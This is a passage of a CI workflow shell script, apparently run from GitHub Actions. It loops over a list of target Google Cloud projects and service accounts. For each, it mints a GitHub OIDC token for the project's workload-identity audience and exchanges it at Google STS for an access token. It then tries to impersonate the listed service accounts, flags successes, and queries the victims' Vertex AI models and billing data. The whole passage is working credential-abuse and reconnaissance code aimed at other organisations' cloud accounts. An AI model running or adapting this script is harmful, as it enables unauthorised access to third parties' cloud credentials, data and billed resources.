          AUD
          while IFS='|' read -r PRJ SAS; do
            [ -z "$PRJ" ] && continue
            AUD="https://iam.googleapis.com/$PRJ"
            echo "##### $PRJ sas=$SAS"
            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
            jq -r '.value // empty' <<<"$J" > tok.jwt
            [ -s tok.jwt ] || { echo "MINT_FAIL"; continue; }
            STS="//iam.googleapis.com/$PRJ"
            code=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
              --data-urlencode "audience=$STS" \
              --data-urlencode "subject_token=$(cat tok.jwt)" \
              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
              -d "scope=https://www.googleapis.com/auth/cloud-platform")
            echo "STS=$code $(head -c 220 r.json | tr -d '\n')"
            FT=$(jq -r '.access_token // empty' r.json)
            if [ -n "$FT" ]; then
              NUM=$(echo "$PRJ" | cut -d/ -f2)
              curl -s -o pj.json -H "Authorization: Bearer $FT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
              PID=$(jq -r '.projectId // empty' pj.json)
              echo "WIDE=$PRJ projectId=$PID"
              for SA in ${SAS//,/ }; do
                jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
                gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
                  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
                echo "  GEN $SA = $gc $(head -c 160 g.json | tr -d '\n')"
                AT=$(jq -r '.accessToken // empty' g.json)
                if [ -n "$AT" ]; then
                  echo "  !!! SA_TOKEN $SA projectId=$PID"
                  curl -s -o ai.json -w '  VERTEX=%{http_code} ' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$PID/locations/us-central1/models"
                  head -c 400 ai.json; echo
                  curl -s -o bi.json -w '  BILLING=%{http_code} ' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$PID/billingInfo"
                  head -c 400 bi.json; echo
                fi
              done
            fi
            sleep 1
          done < targets.txt
